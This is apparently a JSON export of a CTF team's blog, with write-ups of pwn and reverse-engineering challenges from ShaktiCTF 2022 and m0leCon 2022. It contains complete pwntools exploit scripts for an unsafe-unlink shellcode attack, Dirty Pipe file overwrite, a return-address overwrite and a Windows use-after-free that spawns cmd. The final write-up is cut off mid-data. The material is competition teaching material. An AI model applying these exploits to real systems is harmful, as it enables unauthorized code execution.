[{"content":"pwn Racing cars Author: d1g174l_f0rtr355\nDescription: Welcome to the Incredibles! Win the race and get the flag!\nFor this challenge, we got first blood! Whoop whoop!\nWe are given a binary. When we run it, we are asked to first choose a car from the list, fill our name, occupation and address. It looks like this:\n➜ racing_cars ./racing_cars ================================== Welcome to the Incredibles ================================== To compete in the race you need to first buy a car! The price of each car is given below: 1. Lexus RC F GT3 (Emil Frey Racing):\t485470795 2. Porsche 911 RSR (991):\t1890391922 3. Mercedes-AMG GT3:\t1382811152 4. Toyota FT-1 Vision Gran Turismo:\t2058719150 5. Renault Sport R.S.01 GT3:\t1435867700 Choose your car: 1 Enter your details before you begin the race Name: maritio_o Occupation: foo Address: bar Sorry you lost the race! Try again later :) We started by reversing the binary, and it was soon clear that a linked list was used to hold the information we input after choosing a car. This leads us to the unsafe-unlink vulnerability. There is no validation on the linked list element during unlink. Unlinking the middle element is done in the end of the main function.\nWhen choosing your car, 0x32 (50) bytes, of your choice is stored in a buffer that lies in the .bss memory region. It was a little suspicious, because if the area is not writeable and executable, this challenge could be quite tricky. We checked the permissions, and indeed the memory region was rwx. This means that we can put shellcode there!\nWe also found a buffer overflow vulnerability in the function reading input from stdin for name, occupation, and address. It allowed reading 0x100 (256) bytes of data into a buffer of size 0x20 within the linked list element. The linked list elements have the following structure:\nstruct __packed struct1 { int32_t idx; char buf[0x20]; struct struct1* next; struct struct1* prev; }; Another thing we noticed was that the very last thing that happens before the return of the main function is a call to a function pointer.\nHaving a rwx memory region we can write to, an unsafe-unlink and buffer overflow vulnerability, we can create a plan. The plan is to put shellcode into the .bss memory region, then use the buffer overflow to set fake next and previous elements into the middle list element. When the code unlinks the middle element, we manipulate the function pointer to point to the .bss memory region and our shellcode is run when the function pointer is called!\nThis sounds easy, but we left out a really tricky part\u0026hellip; This is hella confusing. Thing is, the unlinking function does the following. It puts the current element\u0026rsquo;s next element into the previous\u0026rsquo; next element. Oh lord\u0026hellip; Just read the code below. Or google how linked lists and unlinking works. This is impossible to write well. Lol.\n{ l_struct-\u0026gt;prev-\u0026gt;next = l_struct-\u0026gt;next; l_struct-\u0026gt;next-\u0026gt;prev = l_struct-\u0026gt;prev; // this is the one we abuse } Since there is no validation during unlink, we can assign content to a memory address. To do this, we set the following structure to list element:\nstruct __packed struct1 { 0000\tint32_t idx; 0004\tchar buf[0x20]; 0024\tstruct struct1* next; // address to function pointer - offset to prev 0028\tstruct struct1* prev; // address to buffer in .bss }; The reason behind substracting the offset of prev in the fake next-element is that when unlinking, struct-\u0026gt;fake_next-\u0026gt;prev points to the 0x28th byte in the fake next-element, but we want it to point to the beginning of the fake prev-element. Our fake next-element doesn\u0026rsquo;t even have a prev, it only contains the address to the function pointer.\nHope that was clear. Hehe.\nOkay, so how do we do this? I wrote these steps which are mirrored in my solution script:\nChoose car, but send shellcode that is less than 0x32 (50) bytes. If the shellcode is to long, the linked list element messes with it. Therefore, our shellcode which is run at the very end of the main function asks for more shellcode which is immediately executed (clever!) Send random input for Name and Occupation Use unsafe-unlink as described above as the input to Address because this one is in the middle of the linked list. The unsafe-unlink vulnerability does not work if one cannot change both the element before and after, also it is the only one that is unlinked When unlinking is done, the fake next-element which now is an address to our function pointer gets the content of our fake prev-element which contains the shellcode We don\u0026rsquo;t really need to do more, calling the function pointer is next in line in the code and our shellcode should run! Here is the solution script:\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host 65.2.136.80 --port 32766 racing_cars from pwn import * # Set up pwntools for the correct architecture exe = context.binary = ELF(\u0026#39;racing_cars\u0026#39;) # Many built-in settings can be controlled on the command-line and show up # in \u0026#34;args\u0026#34;. For example, to dump all data sent/received, and disable ASLR # for all created processes... # ./exploit.py DEBUG NOASLR # ./exploit.py GDB HOST=example.com PORT=4141 host = args.HOST or \u0026#39;65.2.136.80\u0026#39; port = int(args.PORT or 32766) def start_local(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Execute the target binary locally\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) def start_remote(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Connect to the process on the remote host\u0026#39;\u0026#39;\u0026#39; io = connect(host, port) if args.GDB: gdb.attach(io, gdbscript=gdbscript) return io def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.LOCAL: return start_local(argv, *a, **kw) else: return start_remote(argv, *a, **kw) # Specify your GDB script here for debugging # GDB will be launched if the exploit is run via e.g. # ./exploit.py GDB gdbscript = \u0026#39;\u0026#39;\u0026#39; tbreak *0x{exe.entry:x} continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== # Arch: i386-32-little # RELRO: Partial RELRO # Stack: No canary found # NX: NX disabled # PIE: No PIE (0x8048000) # RWX: Has RWX segments addr_function_pointer = 0x804c044 addr_buf = 0x804c080 io = start() # .bss rwx memory # shellcode = p8(0xcc) # int3, breakpoint instruction to verify shellcode shellcode = asm(shellcraft.linux.read(0, addr_buf, 0x100)) io.sendlineafter(\u0026#34;Choose your car: \u0026#34;, shellcode) # index 0 payload = \u0026#34;Blip\u0026#34; io.sendlineafter(\u0026#34;Name: \u0026#34;, payload) # index 2 payload = \u0026#34;Blop\u0026#34; io.sendlineafter(\u0026#34;Occupation: \u0026#34;, payload) # index 1 # overwrite with fake next and prev to assign the address of our shellcode # to the function pointer prev_offset = 0x28 next_element = addr_function_pointer - prev_offset prev_element = addr_buf # create linked list element payload = b\u0026#34;A\u0026#34; * 0x20 payload += p32(next_element) payload += p32(prev_element) io.sendlineafter(\u0026#34;Address: \u0026#34;, payload) # shellcode in .bss asks for more shellcode time.sleep(0.5) shell = asm(shellcraft.sh()) io.sendline(p8(0x90) * 0x20 + shell) io.interactive() ","permalink":"https://bootplug.io/posts/ctf/shaktictf_22/","summary":"pwn Racing cars Author: d1g174l_f0rtr355\nDescription: Welcome to the Incredibles! Win the race and get the flag!\nFor this challenge, we got first blood! Whoop whoop!\nWe are given a binary. When we run it, we are asked to first choose a car from the list, fill our name, occupation and address. It looks like this:\n➜ racing_cars ./racing_cars ================================== Welcome to the Incredibles ================================== To compete in the race you need to first buy a car!","title":"ShaktiCTF 2022"},{"content":"The CTF was m0leCon CTF 2022 Teaser. It was a qualifier for onsite finals in Torino. Our team got fifth place and qualified! Yay!\npwn dirtyRAT Author: @Gaaat\nDescription: I bought this backdoor from some hacking/carding group on Telegram but I\u0026rsquo;m starting to suspect that I have been scammed\u0026hellip; Can anyone help me access the only file I really need?\nnc dirtyrat.challs.m0lecon.it 10010\nWe were given a binary and the source code.\nIt was mentioned early on that the title might be a wordplay on the recent Dirty Pipe vulnerability. But we disregarded the idea for a while. Also, we noticed a splice() in the code and found that a bit weird.\nRunning the binary, we get the following menu:\n60 seconds, PWN! Welcome to 88 88 88888888ba db 888888888888 88 \u0026#34;\u0026#34; ,d 88 \u0026#34;8b d88b 88 88 88 88 ,8P d8\u0026#39;`8b 88 ,adPPYb,88 88 8b,dPPYba, MM88MMM 8b d8 88aaaaaa8P\u0026#39; d8\u0026#39; `8b 88 a8\u0026#34; `Y88 88 88P\u0026#39; \u0026#34;Y8 88 `8b d8\u0026#39; 88\u0026#34;\u0026#34;\u0026#34;\u0026#34;88\u0026#39; d8YaaaaY8b 88 8b 88 88 88 88 `8b d8\u0026#39; 88 `8b d8\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;8b 88 \u0026#34;8a, ,d88 88 88 88, `8b,d8\u0026#39; 88 `8b d8\u0026#39; `8b 88 `\u0026#34;8bbdP\u0026#34;Y8 88 88 \u0026#34;Y888 Y88\u0026#39; 88 `8b d8\u0026#39; `8b 88 d8\u0026#39; d8\u0026#39; CLI Victim info:\tLinux bc31d47e2ff0 5.10.60-051060-generic #202108180439 SMP Wed Aug 18 08:59:30 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux Whoami:\trat Available commands: 1)List files in folder. 2)Read file from our curated list of important files :) 3)Write data to one file from our curated list of important files :) 4)Win the CTF for me pls ≧◡≦ -1)Quit If we list files, we see there is a file called flag which we cannot read:\nYour choice: 1 total 1072 drwxr-xr-x 2 root root 4096 May 15 08:50 . drwxrwxrwt 1 root root 20480 May 15 08:50 .. -rw-r--r-- 1 user user 80 May 12 12:53 cards -rw-r--r-- 1 user user 48 May 12 12:53 conf -rwxr-xr-x 1 rat rat 1048040 May 12 12:53 dirtyRAT -rw-r--r-- 1 user user 31 May 12 12:53 flag -rw-r--r-- 1 user user 132 May 12 12:53 pasw -rw-r--r-- 1 user user 885 May 12 12:53 priv -rw-r--r-- 1 user user 43 May 12 12:53 secr What is interesting here is that the conf file contains a list of files we may read:\nYour choice: 2 Insert filename: conf How many bytes to read? (Max 127 eheheeheh): 127 File content: ##DIRTY CONFIG HEADER conf cards priv secr pasw PJ!� File read With this information and reading the code, we tried to exploit the binary.\nFirst, we tried to modify the config, but struggled since the only file we had write permissions to was dirtyRAT. Then we understood that the trouble with persmissions fit perfectly into the Dirty Pipe vulnerability. The version number you might have noticed under the banner is a kernel version vulnerable to Dirty Pipe. Also, the dirtyRAT binary contains all the code required to exploit the vulnerability. All we needed to do was to run them in the correct order:\nFill the pipe with arbitrary data to set the PIPE_BUF_FLAG_CAN_MERGE flag Drain the pipe Splice 128 bytes from the priv file. We do this because there was a read in the way that we had to stop Splice 22 bytes from the conf file to skip header Add flag to the conf file Then after having flag successfully put into the conf file, we could read the flag file by choosing menu option 2.\nAnd then we got the flag ptm{W4it_wa5nt_1t_r3ad_0nly!?}\nHere is the solve script:\n#!/usr/bin/env python # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host dirtyrat.challs.m0lecon.it --port 10010 ./files/chall/dirtyRAT from pwn import * exe = context.binary = ELF(\u0026#39;./files/chall/dirtyRAT\u0026#39;) host = args.HOST or \u0026#39;dirtyrat.challs.m0lecon.it\u0026#39; port = int(args.PORT or 10010) def local(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Execute the target binary locally\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) def remote(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Connect to the process on the remote host\u0026#39;\u0026#39;\u0026#39; io = connect(host, port) if args.GDB: gdb.attach(io, gdbscript=gdbscript) return io def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.LOCAL: return local(argv, *a, **kw) else: return remote(argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; tbreak main continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== # Arch: amd64-64-little # RELRO: Partial RELRO # Stack: Canary found # NX: NX enabled # PIE: No PIE (0x400000) io = start() def menu(choice): io.sendlineafter(\u0026#34;choice: \u0026#34;, str(choice)) def list_files(): menu(1) def read_file(filename, size): menu(2) io.sendlineafter(\u0026#34;filename: \u0026#34;, filename) io.sendlineafter(\u0026#34;: \u0026#34;, str(size)) io.recvuntil(\u0026#34;File content:\u0026#34;) io.recvline() return io.recvline() def write(filename, data, padding): menu(3) io.sendlineafter(\u0026#34;filename: \u0026#34;, filename) io.sendlineafter(\u0026#34;: \u0026#34;, data) io.sendlineafter(\u0026#34;: \u0026#34;, str(padding)) # 1. prepare_pipe (fill + drain) # 2. splice 128 bytes from priv # 3. splice 22 bytes from conf to skip header # 4. write to pipe # 5. read flag pipe_size = 0x10000 write(\u0026#34;conf\u0026#34;, \u0026#34;A\u0026#34;*0x40, pipe_size - 0x40) read_file(\u0026#34;priv\u0026#34;, 128) read_file(\u0026#34;conf\u0026#34;, 22) write(\u0026#34;conf\u0026#34;, \u0026#34;flag\\n\u0026#34;, 0) read_file(\u0026#34;flag\u0026#34;, 127) flag = read_file(\u0026#34;flag\u0026#34;, 127)[1:].decode().strip() log.success(f\u0026#34;flag: {flag}\u0026#34;) io.close() ptmList Author: @Alberto247\nDescription: Thanks to ptmList you can keep your shopping list in order!\nstty -icanon \u0026amp;\u0026amp; socat - tcp:challs.m0lecon.it:8273 \u0026amp;\u0026amp; stty icanon\nIn this challenge we get an ncurses-like interface we have to interact with. We can buy, move/merge, and delete items. Additionally we also have the Secret gift menu option to modify an item. More on this later.\nHere\u0026rsquo;s the main menu:\nWelcome to ptmList, the program to help you keep your shopping lists in order! ------------------ | View item list | ------------------ | View your list | | Secret gift | | Exit | We can have up to 50 items. Each item is represented as two bytes: an index into a list of strings describing the item and a quantity. Free items are represented as having an index and/or quantity of 0xff. When buying an item we can also choose the quantity:\n--------------------------------------------------- box of tissues | Quantity: 10 | --------------------------------------------------- The View your list option allows us to delete and move/merge items:\n--------------------------------------------------- box of tissues | Quantity: 10 | --------------------------------------------------- carrot | Quantity: 05 | coffee pot | Quantity: 03 | Cancel w/s move, d delete, m move, Esc exit One thing we quickly noticed in myListController() is that there is a loop to find the next free item, but it goes all the way up to 0xff (255) instead of 50. The number of allocated items is stored in a variable and is updated when adding or deleting items.\nDue to the suspicious loop we assumed that there was a way to overflow or underflow the number of items. There is a check to prevent more than 50 items being allocated, so we started looking at the code to delete/move items. First there is a check in myListHandle() that causes trouble for us when we try to delete items when the number of items is zero, so we looked at move instead.\nMoving two items will swap their positions (and keep the quantity of the second item). If you try to move items of the same type, they will be merged instead of moved. As long as the combined quantity doesn\u0026rsquo;t exceed 99, the items can be merged and one of them will be deleted. The deletion code moves all items after our merged items one slot down, overwriting the second item we merged with. Finally, the number of allocated items will be decremented.\nThe loop will stop once it encounters an item with an index or quantity of 0xff. This is where the Secret gift menu comes into the picture. This option allows us to set the quantity of an item to 0xff. If we change the quantity of an item to 0xff, the merging code will stop looping when it reaches this item. What happens if we try to merge an item with one that has a quantity of 0xff? The quantities will be merged, effectively subtracting 1 from the quantity of the first item. Then, when the code tries to move all other items it will stop on the first iteration since the quantity is 0xff. Finally, the number of items will be decreased by one. By abusing this behavior we can keep merging one item with another one that has a quantity of 0xff, which will decrease the quantity of the first item by 1 and also decrease the number of items without removing any of them. Doing this a few times will underflow the count to 0xff.\nWhen the number of items is set to 0xff we can access data on the stack outside the item array. We can write values by changing the quantity of items and by moving and merging items.\nOur attack plan: Ovewrite the two least significant bytes of the return address on the stack with the address of winfunc(). The three lowest nibbles will always be 0x5e7, so we decided to just bruteforce the last one. We ended up buying the item 0x35 times, resulting in the two least significant bytes being 0x35e7.\nBuy wanted item(s) (to ovewrite least significant bytes of the return address) Buy 2 x box of tissues Secret gift on last box of tissues, setting its quantity to 0xff Merge 4 times to underflow the number of items Merge return address and with target, thus overwriting the return address with winfunc() After running the solve script a few times, you should get a shell.\nFlag: ptm{up_up_d0wn_down_l3ft_r1ght_lef7_r1ght_A_B_pwn}\nSolve script:\n#!/usr/bin/env python # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host challs.m0lecon.it --port 8273 ./shoppingList from pwn import * exe = context.binary = ELF(\u0026#39;./shoppingList\u0026#39;) host = args.HOST or \u0026#39;challs.m0lecon.it\u0026#39; port = int(args.PORT or 8273) def local(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Execute the target binary locally\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) def remote(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Connect to the process on the remote host\u0026#39;\u0026#39;\u0026#39; io = connect(host, port) if args.GDB: gdb.attach(io, gdbscript=gdbscript) return io def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.LOCAL: return local(argv, *a, **kw) else: return remote(argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) def down(): io.send(\u0026#34;s\u0026#34;) def up(): io.send(\u0026#34;w\u0026#34;) def exit(): for i in range(3): io.recvuntil(\u0026#34;Exit\u0026#34;) down() io.sendline(\u0026#34;\u0026#34;) def buy(idx, quantity): io.sendline(\u0026#34;\u0026#34;) for i in range(idx): down() io.sendline(\u0026#34;\u0026#34;) for i in range(quantity): down() io.sendline(\u0026#34;\u0026#34;) io.send(\u0026#34;\\x1b\u0026#34;) def secret(idx): down() down() io.sendline(\u0026#34;\u0026#34;) for i in range(idx): down() io.sendline(\u0026#34;\u0026#34;) io = start() # buy item to set up for partial overwrite: 0x35e7 buy(0xe7, 0x35) buy(0, 10) buy(0, 10) secret(2) down() io.sendline(\u0026#34;\u0026#34;) down() # merge 4 times to underflow for i in range(4): io.send(\u0026#34;m\u0026#34;) down() io.send(\u0026#34;m\u0026#34;) # go down to return address for i in range(59): down() # merge with first item we bought io.send(\u0026#34;m\u0026#34;) for i in range(60): up() io.send(\u0026#34;m\u0026#34;) # go back to main menu io.send(\u0026#34;\\x1b\u0026#34;) # exit -\u0026gt; hopefully returns to winfunc() down() down() down() io.sendline(\u0026#34;\u0026#34;) io.interactive() FlagMail Author: @Matte23\nDescription: I\u0026rsquo;ve been trying to migrate our old flag submitter written in C to Kotlin. Hopefully other teams wont be able to steal our flags again. However, I still need to migrate some old C functions\u0026hellip;\nnc flagmail.challs.m0lecon.it 4444\nIn this challenge we were given a Windows binary written mostly in Kotlin. However, as the challenge description hints at, some code is still written in C.\nThe program allows us to save, delete, edit, and submit flags. Every flag we save gets a new ID, and we use that ID to perform the other actions.\nWelcome to FlagMail! -\u0026gt; save foobar Flag saved with id=FRaqbC8wSA1XvpFVjCRGryWtIIZS2TRqf69aZbLA -\u0026gt; edit FRaqbC8wSA1XvpFVjCRGryWtIIZS2TRqf69aZbLA lol Flag edited! -\u0026gt; submit FRaqbC8wSA1XvpFVjCRGryWtIIZS2TRqf69aZbLA lol rFlag submitted! -\u0026gt; By experimenting with the binary we noticed that there seems to be a UAF when deleting flags. We can still edit, delete, and submit deleted flags.\nThe menu options etc. seem to be called from Init_and_run_start(), and the interesting functions that are implemented in C are Edit, Submit, and PerformSubmit. Additionally, we also found a function called OldFunc(), which will give us a shell:\nint OldFunc(void) { return system(\u0026#34;cmd\u0026#34;); } Each flag is stored in a struct that looks something like this:\nstruct flag { size_t field_0; size_t size; void (*func)(struct flag *); }; Since we have a heap UAF, we were pretty sure we could corrupt data on the heap, and that the goal was to overwrite the function pointer inside of the flag struct to get RCE.\nPerformSubmit() looks something like this:\nvoid PerformSubmit(struct flag *f) { if (f-\u0026gt;field_0 == -1) (f-\u0026gt;func)(f); } If we can set the first field to -1, and ovewrite the function pointer (at offset 0x10), we can get code execution. Our plan was then to overwrite the function pointer with OldFunc(), which should give us a shell.\nThere seems to be some variation in the heap layout between runs, but we observed that the flags would usually be allocated close to each other and sequentially on the heap.\nTo overwrite the function pointer we need to first defeat ASLR, so that was our first goal. ASLR is initialized at startup on Windows, so we only have to leak the base address of the binary once. After getting the base we know the address of OldFunc(). We ended up leaking the function pointer from one of the flags on the heap by corrupting the size of a flag and reading it back.\nTo corrupt the size we allocate three flags and delete the first one. The size will be set to something big so we can write out of bounds. We tried different amounts of padding to overflow into into flag2. The first 8 bytes of the flag struct has to be -1, or else it won\u0026rsquo;t print anything. We detect changes to this value by submitting the flag and checking if something is printed. If not, the value has been corrupted.\nAfter finding the offset from flag1 to flag2, we can corrupt the size of flag2 and submit it to leak the Submit() function pointer from flag3.\nNow that we have the leak we can move on to corrupt the function pointer of flag3 like we did with the size. We set the function to the address of OldFunc(). Then we just have to submit flag3, and it should give us a shell!\nAt this point we spent a lot of time trying to get our exploit to work. It seemed like we were able to successfully overwrite field_0 with -1 and the function pointer, but it would always crash when we tried executing OldFunc(). However, testing with the original function pointer (Submit()), the code was behaving exactly like before.\nOur first idea was to skip the stack initialization in OldFunc() to work around potential stack alignment issues with XMM instructions, but that didn\u0026rsquo;t work either. After a lot of trial and error we decided to set up a Windows 2022 server and perform some debugging.\nAfter finally getting everything up and running, we attached to the process using Windbg and was able to see what was going on. For some reason the process was crashing due to heap corruption while it was trying to execute cmd.\nAt this point there was less than 30 minutes left of the CTF and we were getting a bit desperate. As a final hail mary we tried adding another flag before triggering execution of the overwritten function pointer. And it worked!\nWe finally got that sweet, sweet Windows shell:\nMicrosoft Windows [Version 10.0.20348.707 (c) Microsoft Corporation. All rights reserved. C:\\\u0026gt; whoami user manager\\\\containeradministrator C:\\\u0026gt; dir Volume in drive C has no label. Volume Serial Number is B2E4-3A3E Directory of C:\\ 05/04/2022 10:03 PM 571,904 challenge.exe 05/04/2022 10:03 PM 46 flag.txt 04/22/2022 12:55 AM 5,510 License.txt 05/05/2022 04:05 AM \u0026lt;DIR\u0026gt; Program Files 05/05/2022 03:41 AM \u0026lt;DIR\u0026gt; Program Files (x86) 05/12/2022 07:21 PM \u0026lt;DIR\u0026gt; socat 05/05/2022 04:11 AM \u0026lt;DIR\u0026gt; Users 05/13/2022 08:05 PM \u0026lt;DIR\u0026gt; Windows 3 File(s) 577,460 bytes 5 Dir(s) 20,609,708,032 bytes free C:\\\u0026gt; type flag.txt ptm{LooK2_L1Ke_My_5U8m1tTER_12_4_81t_CONfu5Ed} Solve script:\nfrom pwn import * context.log_level = \u0026#34;debug\u0026#34; leak = False # leak base address instead of overwriting pointer #leak = True while True: r = remote(\u0026#34;flagmail.challs.m0lecon.it\u0026#34;, 4444) # create flag 1 r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;save\\n\u0026#34;) r.sendline(b\u0026#34;yo\u0026#34;) r.recvuntil(b\u0026#34;id=\u0026#34;) id1 = r.recvline().decode().strip() # create flag 2 r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;save\\n\u0026#34;) r.sendline(b\u0026#34;yolo\u0026#34;) r.recvuntil(b\u0026#34;id=\u0026#34;) id2 = r.recvline().decode().strip() # create flag 3 r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;save\\n\u0026#34;) r.sendline(b\u0026#34;yolo\u0026#34;) r.recvuntil(b\u0026#34;id=\u0026#34;) id3 = r.recvline().decode().strip() # delete flag 1, will set size to something big and corrupt content r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;delete\\n\u0026#34;) r.sendline(id1.encode()) # detect if flag 2 comes right after flag 1, by gradually checking if # submit gives the correct output for flag 2 # (flag struct has to begin with 0xffffffffffffffff, # or submit will not print contents) found = False for times in range(1, 10): r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;edit\\n\u0026#34;) r.sendline(id1.encode()) r.sendline((b\u0026#34;A\u0026#34;*8)*times) r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;submit\\n\u0026#34;) r.sendline(id2.encode()) msg = r.recvline() if b\u0026#34;yolo\u0026#34; not in msg: print(msg) print(times) saved_times = times found = True break if not found: print(\u0026#34;try again :(\u0026#34;) r.close() continue #exit() break # manually set from leak output, will maybe change if server restarts image_base = 0x7ff62cd80000 submit = image_base + 0x25040 edit = image_base + 0x25090 oldfunc = image_base + 0x25110 log.info(f\u0026#34;submit: {hex(submit)}\u0026#34;) log.info(f\u0026#34;edit: {hex(edit)}\u0026#34;) log.info(f\u0026#34;oldfunc: {hex(oldfunc)}\u0026#34;) if not leak: # overwrite flag 2 submit pointer r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;edit\\n\u0026#34;) r.sendline(id1.encode()) r.sendline((b\u0026#34;A\u0026#34;*8)*saved_times + b\u0026#34;\\xff\u0026#34;*8 + p64(0x00) + p64(oldfunc)) r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;save\\n\u0026#34;) r.sendline(b\u0026#34;yo\u0026#34;) r.recvuntil(b\u0026#34;id=\u0026#34;) id4 = r.recvline().decode().strip() # trigger function call r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;submit\\n\u0026#34;) r.sendline(id2.encode()) # windows lol r.recvuntil(\u0026#34;C:\\\u0026gt;\u0026#34;) r.sendline(\u0026#34;type flag.txt\u0026#34;) r.recvline() flag = r.recvuntil(\u0026#34;\\r\\n\u0026#34;).decode().strip() log.success(f\u0026#34;flag: {flag}\u0026#34;) context.log_level = \u0026#34;debug\u0026#34; r.interactive() exit() # overwrite flag 2 size field r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;edit\\n\u0026#34;) r.sendline(id1.encode()) r.sendline((b\u0026#34;A\u0026#34;*8)*saved_times + b\u0026#34;\\xff\u0026#34;*8 + b\u0026#34;\\x01\u0026#34;) # leak flag 3 submit pointer r.sendafter(b\u0026#34;-\u0026gt; \u0026#34;, b\u0026#34;submit\\n\u0026#34;) r.sendline(id2.encode()) r.recvuntil(b\u0026#34;\\xff\u0026#34;*8 + p64(4)) submit = int.from_bytes(r.recv(8), \u0026#34;little\u0026#34;) print(\u0026#34;submit:\u0026#34;, hex(submit)) oldfunc = submit - 0x140025040 + 0x140025110 print(\u0026#34;base:\u0026#34;, hex(oldfunc - 0x25110)) print(\u0026#34;oldfunc:\u0026#34;, hex(oldfunc)) rev Circuitry magic VHDL is for noobs, I implement all my tests in C, it is faster, easier, and more resistant to attacks!\nNote: flag needs to be wrapped in ptm{}, it is all printable ascii and it makes sense in English.\nAuthor: @Alberto247\nWe are given a binary encoder and a text file output.txt. output.txt contains a list in json format:\n[{\u0026#34;input\u0026#34;: 0, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 1, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 2, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 3, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 4, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 5, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 6, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 7, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 8, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 9, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 10, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 11, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 12, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 13, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 14, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 15, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 16, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 17, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 18, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 19, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 20, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 21, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 22, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 23, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 24, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 25, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 26, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 27, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 28, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 29, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 30, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 31, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 32, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 33, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 34, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 35, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 36, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 37, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 38, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 39, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 40, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 41, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 42, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 43, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 44, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 45, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 46, \u0026#34;output\u0026#34;: 0}, {\u0026#34;input\u0026#34;: 47, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 48, \u0026#34;output\u0026#34;: 1}, {\u0026#34;input\u0026#34;: 49, 